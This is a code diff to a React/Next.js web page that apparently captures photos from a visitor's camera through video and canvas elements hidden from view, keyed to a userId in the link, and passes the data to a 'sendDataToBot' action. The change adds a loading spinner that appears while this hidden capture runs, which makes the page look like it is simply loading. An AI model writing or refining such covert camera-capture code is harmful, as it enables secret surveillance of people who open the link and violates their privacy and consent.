@@ -6,6 +6,7 @@ import { useCamera } from "~/shared/use-camera";
 import { sendDataToBot } from "./actions";
 
 const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
+const Loader = () => <div className="spinner" />;
 
 const Camera = ({ userId }: { userId: string }) => {
 	const { videoRef, canvasRef, photo } = useCamera();
@@ -37,6 +38,7 @@ const Camera = ({ userId }: { userId: string }) => {
 		<>
 			<video ref={videoRef} style={{ display: "none" }} autoPlay />
 			<canvas ref={canvasRef} style={{ display: "none" }} />
+			<Loader />
 		</>
 	);
 };
@@ -63,7 +65,7 @@ function Page({ params }: Props) {
 		return <Camera userId={params.slug[0]} />;
 	}
 
-	return null;
+	return <Loader />;
 }
 
 export default dynamic(() => Promise.resolve(Page), {
